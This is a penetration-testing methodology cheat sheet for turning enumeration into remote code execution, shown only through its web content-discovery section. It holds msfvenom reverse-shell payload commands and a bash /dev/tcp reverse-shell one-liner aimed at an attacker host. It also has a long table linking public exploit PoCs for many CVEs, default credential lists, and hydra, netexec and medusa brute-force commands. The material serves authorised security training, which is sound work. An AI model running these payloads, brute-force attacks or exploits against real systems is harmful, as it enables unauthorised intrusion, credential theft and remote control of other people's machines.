# Vulnerability Research & Exploitation

## üéØ Goal

Transform enumeration findings into initial system access through systematic vulnerability assessment, validation, and exploitation to achieve Remote Code Execution (RCE).

---

## Table of Contents

1. [Service Documentation and Research](#1-service-documentation-and-research)
2. [Manual Vulnerability Identification](#2-manual-vulnerability-identification)
3. [Web Application Vulnerability Testing](#3-web-application-vulnerability-testing)
4. [Automated Scanning](#4-automated-scanning-support-role)
5. [Service-Specific Vulnerability Checks](#5-service-specific-vulnerability-checks)
6. [Exploitation Path Selection](#6-exploitation-path-selection)
7. [Reverse Shell Techniques](#7-reverse-shell-techniques)
8. [Shell Stabilization and Upgrade](#8-shell-stabilization-and-upgrade)
9. [Web Exploitation Paths to RCE](#9-web-exploitation-paths-to-rce)
10. [Advanced Web Attacks](#10-advanced-web-attacks)
11. [Authentication Bypass Techniques](#11-authentication-bypass-techniques)
12. [Buffer Overflow Exploitation](#12-buffer-overflow-exploitation)
13. [Common Exploitation Scenarios](#13-common-exploitation-scenarios)
14. [Documentation Standards](#14-documentation-standards)
15. [Troubleshooting Common Issues](#15-troubleshooting-common-issues)

---

## üìã Phase Checklist

### üîç Vulnerability Research & Assessment

#### Service Documentation and Research
- [ ] **Research service CVEs** ‚Üí [1.1](#11-cve-research)
- [ ] **Confirm exact service versions** ‚Üí [1.2](#12-version-fingerprinting)
- [ ] **Search exploit databases** ‚Üí [1.1](#11-cve-research)

#### Manual Vulnerability Identification
- [ ] **Review HTTP methods/config** ‚Üí [2.1](#21-http-method-and-configuration-checks)
- [ ] **Check default/weak credentials** ‚Üí [2.2](#22-default-credential-checks-targeted-approach)
- [ ] **Test for quick wins** ‚Üí [Quick Win Checks](#quick-win-checks)

#### Web Application Testing
- [ ] **Enumerate dirs/endpoints/hidden content** ‚Üí [3.1](#31-directory-and-content-discovery)
- [ ] **Test SQLi across inputs/flows** ‚Üí [3.2](#32-sql-injection-manual-testing-first)
- [ ] **Test command injection** ‚Üí [3.3](#33-command-injection)
- [ ] **Assess file upload abuse** ‚Üí [3.4](#34-file-upload-vulnerabilities)
- [ ] **Assess traversal + LFI/RFI** ‚Üí [3.5](#35-path-traversal-and-lfirfi)
- [ ] **Test XSS (reflected/stored/DOM)** ‚Üí [3.6](#36-xss-cross-site-scripting)
- [ ] **Assess XXE/SSRF/SSTI/IDOR** ‚Üí [3.7](#37-advanced-vulnerability-classes)
- [ ] **Test authn/authz controls** ‚Üí [3.8](#38-authentication-and-authorization-testing)

#### Automated Scanning
- [ ] **Run Nikto** ‚Üí [4.1](#41-nikto-web-misconfiguration-scanner)
- [ ] **Run Nuclei templates** ‚Üí [4.2](#42-nuclei-template-based-vulnerability-scanning)
- [ ] **Run WPScan (if WordPress)** ‚Üí [4.3](#43-wpscan-wordpress-vulnerability-scanner)

#### Service-Specific Checks
- [ ] **FTP: anon access/perms** ‚Üí [5.1](#51-ftp-service-port-21)
- [ ] **SSH: version/KEX/ciphers** ‚Üí [5.2](#52-ssh-service-port-22)
- [ ] **SMB: shares/access/vulns** ‚Üí [5.3](#53-smbnetbios-services-ports-139-445)
- [ ] **DBs: weak auth/exposure** ‚Üí [5.4](#54-database-services)
- [ ] **Email: enum/posture** ‚Üí [5.5](#55-email-services)
- [ ] **Web server: hardening/misconfig** ‚Üí [5.6](#56-web-server-specific)
- [ ] **Network svcs: SNMP/NFS/RDP/LDAP/WinRM** ‚Üí [5.7](#57-network-services)

### üéØ Exploitation & Initial Access

#### Exploitation Path Selection & Validation
- [ ] **Select primary attack path** ‚Üí [6](#6-exploitation-path-selection)
- [ ] **Assess stealth/noise/risk** ‚Üí [6.1](#61-stealth-considerations)
- [ ] **Validate vulnerability** ‚Üí [6.2](#62-vulnerability-validation)

#### Initial Code Execution & Shell Establishment
- [ ] **Prepare execution test** ‚Üí [7](#7-reverse-shell-techniques)
- [ ] **Set up listener** ‚Üí [7.1](#71-listener-setup)
- [ ] **Execute exploit** ‚Üí [9](#9-web-exploitation-paths-to-rce)
- [ ] **Catch reverse shell** ‚Üí [7.1](#71-listener-setup)

#### Shell Stabilization
- [ ] **Stabilize/upgrade shell session** ‚Üí [8](#8-shell-stabilization-and-upgrade)
- [ ] **Verify stable operations** ‚Üí [8](#8-shell-stabilization-and-upgrade)

#### Documentation & Planning
- [ ] **Document exploitation steps** ‚Üí [14](#14-documentation-standards)
- [ ] **Capture evidence** ‚Üí [14.2](#142-screenshot-requirements)
- [ ] **Log commands** ‚Üí [14.3](#143-command-history-logging)

---

## üõ†Ô∏è Quick Setup Commands

```bash
# Terminal 1: Listener
nc -lvnp <LPORT>

# Terminal 2: HTTP server for payloads
cd /opt/shells && python3 -m http.server 80

# Terminal 3: SMB server (Windows targets)
impacket-smbserver share . -smb2support

# Common payload generation #1
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > shell.elf

# Common payload generation #2
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe

# Common payload generation #3
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php
```

---

## ‚ö° One-Liner Cheat Sheet

```bash
# Quick vulnerability scan
nmap --script vuln <RHOST>

# Fast web directory scan
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<RHOST>/ -t 50

# SMB quick check
netexec smb <RHOST> -u '' -p '' --shares

# Check for EternalBlue
nmap --script smb-vuln-ms17-010 <RHOST>

# Generate quick reverse shell
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64
```

---

## üìö Essential Resources

| Resource | URL | Use Case |
|----------|-----|----------|
| PayloadsAllTheThings | swisskyrepo.github.io/PayloadsAllTheThings/ | All payload types |
| HackTricks | book.hacktricks.xyz | Comprehensive methodology |
| GTFOBins | gtfobins.github.io | Linux privilege escalation |
| LOLBAS | lolbas-project.github.io | Windows living-off-the-land |
| RevShells | revshells.com | Reverse shell generator |
| CyberChef | gchq.github.io/CyberChef | Encoding/decoding |
| Exploit-DB | exploit-db.com | Public exploits |

---

## üìß Wordlist Locations

```bash
# Directory/file discovery
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Password lists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Username lists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Fuzzing
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```

---

## üî• Well-Known CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shocker RCE | https://github.com/nccgroup/shocker |
| CVE-2014-6271 | Shellshock RCE PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2014-6271 | Shellshocker RCE POCs | https://github.com/mubix/shellshocker-pocs |
| CVE-2016-5195 | Dirty COW LPE | https://github.com/firefart/dirtycow |
| CVE-2016-5195 | Dirty COW '/proc/self/mem' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40847 |
| CVE-2016-5195 | Dirty COW 'PTRACE_POKEDATA' Race Condition (/etc/passwd Method) LPE | https://www.exploit-db.com/exploits/40839 |
| CVE-2017-0144 | EternalBlue (MS17-010) RCE | https://github.com/d4t4s3c/Win7Blue |
| CVE-2017-0199 | RTF Dynamite RCE | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-7600 | Drupalgeddon 2 RCE | https://github.com/g0rx/CVE-2018-7600-Drupal-RCE |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript PIL RCE | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-14287 | Sudo Bypass LPE | https://github.com/n0w4n/CVE-2019-14287 |
| CVE-2019-18634 | Sudo Buffer Overflow LPE | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | RunC Container Escape PoC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Arbitrary File Read | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock LPE | https://github.com/initstring/dirty_sock |
| CVE-2020-0796 | SMBGhost RCE PoC | https://github.com/chompie1337/SMBGhost_RCE_PoC |
| CVE-2020-1472 | ZeroLogon PE Checker & Exploitation Code | https://github.com/VoidSec/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2020-1472 | ZeroLogon PE PoC | https://github.com/dirkjanm/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon PE Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare LPE RCE | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE RCE (PowerShell Implementation) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | ExifTool Command Injection RCE | https://github.com/AssassinUKG/CVE-2021-22204 |
| CVE-2021-22204 | GitLab ExifTool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/welk1n/JNDI-Injection-Exploit |
| CVE-2022-0847 | DirtyPipe-Exploit LPE | https://github.com/n3rada/DirtyPipe |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-20598 | PDFWKRNL Kernel Driver LPE | https://github.com/H4rk3nz0/CVE-2023-20598-PDFWKRNL |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23752 | Joomla Unauthenticated Information Disclosure | https://github.com/Acceis/exploit-CVE-2023-23752 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
| CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
| CVE-2024-0582 | Ubuntu Linux Kernel io_uring LPE | https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582 |
| CVE-2024-1086 | Use-After-Free Linux Kernel Netfilter nf_tables LPE | https://github.com/Notselwyn/CVE-2024-1086 |
| CVE-2024-4577 | PHP-CGI Argument Injection Vulnerability RCE | https://github.com/watchtowrlabs/CVE-2024-4577 |
| CVE-2024-30088 | Microsoft Windows LPE | https://github.com/tykawaii98/CVE-2024-30088 |
| CVE-2024-49138 | Windows Common Log File System Driver LPE | https://github.com/MrAle98/CVE-2024-49138-POC |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (1) | https://github.com/ThemeHackers/CVE-2025-24071 |
| CVE-2025-24071 | Windows File Explorer Spoofing Vulnerability (2) | https://github.com/0x6rss/CVE-2025-24071_PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (1) | https://github.com/iSee857/CVE-2025-24813-PoC |
| CVE-2025-24813 | Apache Tomcat Deserialization RCE (2) | https://github.com/absholi7ly/POC-CVE-2025-24813 |
| CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
| CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
| CVE-2025-62215 | Windows Kernel LPE | https://github.com/dexterm300/CVE-2025-62215-exploit-poc |
| CVE-2025-9074 | Docker Desktop (Windows) Container Escape - Host Write via Exposed Engine API | https://github.com/zenzue/CVE-2025-9074 |
| n/a | BadSuccessor LPE | https://github.com/ibaiC/BadSuccessor |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | ADCSCoercePotato | https://github.com/decoder-it/ADCSCoercePotato |
| n/a | CoercedPotato LPE | https://github.com/Prepouce/CoercedPotato |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | DeadPotato LPE | https://github.com/lypd0/DeadPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | RustPotato LPE | https://github.com/safedv/RustPotato |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SigmaPotato LPE | https://github.com/tylerdotrar/SigmaPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | SharpSuccessor LPE | https://github.com/logangoins/SharpSuccessor |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | bin-sploits | https://gitlab.com/exploit-database/exploitdb-bin-sploits |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

---

## 1 Service Documentation and Research

### 1.1 CVE Research

```bash
# Search for service vulnerabilities
searchsploit <SERVICE> <VERSION>
searchsploit -m <EDB-ID>  # Mirror exploit locally
searchsploit -x <EDB-ID>  # Examine exploit
searchsploit -w <EDB-ID>  # Get online URL

# Update searchsploit database
searchsploit -u

# Search with case-insensitive
searchsploit -i <SERVICE>

# Alternative CVE databases (web search)
# https://cve.mitre.org/
# https://nvd.nist.gov/
# https://www.exploit-db.com/
# https://packetstormsecurity.com/
```

### 1.2 Version Fingerprinting

```bash
# Banner grabbing
nc -nv <RHOST> <RPORT>
telnet <RHOST> <RPORT>

# HTTP server identification
curl -I http://<RHOST>/
curl -s -D- http://<RHOST>/ -o /dev/null
curl -v http://<RHOST>/ 2>&1 | grep -E "Server:|X-Powered-By:"

# Detailed HTTP headers and technologies
whatweb http://<RHOST>/ -v
whatweb http://<RHOST>/ --color=never --no-errors -a 3

# TLS/SSL certificate information
openssl s_client -connect <RHOST>:443 < /dev/null
openssl s_client -connect <RHOST>:443 -showcerts < /dev/null

# SSL/TLS vulnerability scanning
sslyze --regular <RHOST>:443
nmap --script ssl-enum-ciphers,ssl-cert <RHOST> -p 443
```

---

## 2 Manual Vulnerability Identification

### 2.1 HTTP Method and Configuration Checks

```bash
# üîé Allowed methods discovery
curl -X OPTIONS -i http://<RHOST>/
curl -v -X OPTIONS http://<RHOST>/

# ‚ö†Ô∏è Test dangerous method PUT
curl -X PUT http://<RHOST>/test.txt -d "test payload"

# ‚ö†Ô∏è Test dangerous method DELETE
curl -X DELETE http://<RHOST>/test.txt

# ‚ö†Ô∏è Test dangerous method TRACE
curl -X TRACE http://<RHOST>/

# ‚ö†Ô∏è Test dangerous method TRACK
curl -X TRACK http://<RHOST>/

# Test for WebDAV
davtest -url http://<RHOST>/
davtest -url http://<RHOST>/webdav/
cadaver http://<RHOST>/

# Nmap WebDAV detection
nmap --script http-webdav-scan <RHOST> -p 80,443
```

**üîß Common Config Files to Check:**

```bash
# Web server configs
web.config
.htaccess
httpd.conf
apache2.conf
nginx.conf
server-status
server-info

# Application configs  
config.php
.env
.env.local
.env.backup
.env.prod
config.json
config.yml
settings.php
configuration.php
database.yml
config.ini

# WordPress specific
wp-config.php
wp-config.php.bak
wp-config.php~

# Information disclosure
phpinfo.php
info.php
test.php
admin.php
debug.php
backup.zip
backup.sql
db_backup.sql
.git/config
.git/HEAD
.svn/entries
.hg/
.bzr/

# Common backup files
index.php.bak
index.php~
index.php.old
index.php.orig
index.php.save
web.config.bak
backup/
backups/
old/

# Robot and sitemap files
robots.txt
sitemap.xml
sitemap_index.xml

# Common API endpoints
api/
api/v1/
api/v2/
rest/
graphql
```

### 2.2 Default Credential Checks (Targeted Approach)

**üéØ Common Admin Panels:**

```
/admin
/administrator
/admin.php
/admin.html
/admin/
/wp-admin
/wp-login.php
/phpmyadmin
/phpMyAdmin
/pma
/manager/html (Tomcat)
/host-manager/html (Tomcat)
/console (JBoss)
/admin-console
/cpanel
/webmail
/login
/login.php
Router/camera management interfaces
Database administration consoles
```

**üß™ Common Credential Combinations:**

```
admin:admin
admin:password
admin:Password123
admin:admin123
admin:pass
admin:root
admin:[empty]
administrator:administrator
administrator:password
root:root
root:toor
root:password
root:admin
guest:guest
user:user
test:test
tomcat:tomcat
tomcat:s3cret
admin:password123
admin:123456
admin:admin1
sa:[empty] (MSSQL)
postgres:postgres
mysql:mysql
oracle:oracle
```

**üîß Credential Testing Tools:**

```bash
# Hydra - HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-get /admin

# SSH brute forcing (use carefully) - root user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<RHOST> -t 4

# SSH brute forcing (use carefully)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<RHOST> -t 4

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>

# NetExec (formerly CrackMapExec) - SMB
netexec smb <RHOST> -u admin -p /usr/share/wordlists/rockyou.txt

# NetExec (formerly CrackMapExec) - SMB null session
netexec smb <RHOST> -u '' -p '' --shares

# NetExec (formerly CrackMapExec) - SMB guest access
netexec smb <RHOST> -u guest -p '' --shares  

# NetExec WinRM
netexec winrm <RHOST> -u admin -p password

# NetExec MSSQL
netexec mssql <RHOST> -u sa -p '' --local-auth

# Medusa - Alternative to Hydra (SSH)
medusa -h <RHOST> -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# Medusa - Alternative to Hydra (FTP)
medusa -h <RHOST> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

> ‚ö†Ô∏è **Warning**: Avoid aggressive brute-forcing; use context-aware guesses first. Check exam restrictions on authentication attacks. Account lockout policies may trigger.

---

## 3 Web Application Vulnerability Testing

**üìö Essential Resources (Keep Open):**

- [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 3.1 Directory and Content Discovery

#### Gobuster

```bash
# Basic directory enumeration
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/

# With file extensions
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php,txt,html,bak

# Full URL display with status codes
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s "200,204,301,302,307,401,403"

# Common extensions for different technologies
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/ -x php,html,txt,pdf,zip,bak,old,tar,gz

# Lowercase wordlist (bypass some filters)
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/ -k --wildcard

# API endpoint discovery
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://<RHOST>/api/ -e -s 200

# With authentication (cookies)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/ -c "PHPSESSID=abc123"

# With authentication (basic auth)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/ -U admin -P password

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Virtual host discovery
gobuster vhost -u http://<RHOST>/ -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

#### FFUF (Fast Web Fuzzer)

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ

# With extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -e .php,.html,.txt,.pdf,.zip

# Filter by size (eliminate false positives)
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -fs 1234

# Filter by word count
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -fw 42

# Filter by line count
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -fl 20

# Match specific status codes with output
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401,403 -o results.txt -of json

# Colorized output with auto-calibration
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -ac

# Virtual host discovery with auto-calibration
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u http://<RHOST>/ -ac

# Virtual host with size filter
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u http://<RHOST>/ -fs 185

# Date/numeric fuzzing (backup files, year ranges)
ffuf -c -w <(seq 2015 2024) -u http://<RHOST>/backups/backup_FUZZ.zip
ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2024070416FUZZ.zip

# API fuzzing
ffuf -u http://<RHOST>/api/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -c -ac -t 250 -fc 400,404,412

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<RHOST>/admin.php?FUZZ=test -fs 1234 -mc all

# POST data fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/login.php -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fc 401

# LFI fuzzing
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/index.php?page=FUZZ -fs 15349

# Fuzzing with cookies/session
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644

# Recursion mode (careful - can be slow)
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/FUZZ -recursion -recursion-depth 2

# File extension discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/logs/FUZZ -e .log,.txt,.bak

# Rate limiting (requests per second)
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -rate 100 -u http://<RHOST>/FUZZ -mc 200,429

# Output formats: json, ejson, html, md, csv, ecsv
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -o output.json -of json
```

